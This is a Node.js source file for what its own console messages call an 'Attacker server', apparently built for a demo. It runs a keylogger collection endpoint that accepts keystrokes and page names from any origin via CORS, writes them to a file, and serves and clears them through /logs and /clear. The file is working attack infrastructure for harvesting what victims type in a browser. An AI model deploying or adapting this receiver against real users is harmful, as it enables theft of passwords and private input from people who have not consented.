const http = require('http');
const fs = require('fs');
const url = require('url');

const PORT = 3002;
const KEYLOG_FILE = 'keylog.txt';

// Create the server
const server = http.createServer((req, res) => {
  // Enable CORS for all origins (for demo purposes)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  const parsedUrl = url.parse(req.url, true);
  const method = req.method;

  if (method === 'OPTIONS') {
    // Handle preflight requests
    res.writeHead(200);
    res.end();
    return;
  }

  if (method === 'POST' && parsedUrl.pathname === '/keylog') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] Key: "${data.key}" | Page: ${data.page || 'unknown'}\n`;
        
        // Log to console
        console.log(`🎯 Keystroke captured: ${data.key}`);
        
        // Append to file
        fs.appendFileSync(KEYLOG_FILE, logEntry);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'logged' }));
      } catch (error) {
        console.error('Error parsing keylog data:', error);
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
  } else if (method === 'GET' && parsedUrl.pathname === '/logs') {
    // Endpoint to view captured logs
    try {
      const logs = fs.readFileSync(KEYLOG_FILE, 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(logs || 'No keystrokes captured yet.');
    } catch (error) {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('No keystrokes captured yet.');
    }
  } else if (method === 'GET' && parsedUrl.pathname === '/clear') {
    // Endpoint to clear logs
    try {
      fs.writeFileSync(KEYLOG_FILE, '');
      console.log('🧹 Keylog cleared');
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('Logs cleared successfully.');
    } catch (error) {
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      res.end('Error clearing logs.');
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log(`🚨 Attacker server running on http://localhost:${PORT}`);
  console.log(`📝 Keystrokes will be logged to: ${KEYLOG_FILE}`);
  console.log(`📋 View logs at: http://localhost:${PORT}/logs`);
  console.log(`🧹 Clear logs at: http://localhost:${PORT}/clear`);
});

// Handle server shutdown gracefully
process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down attacker server...');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});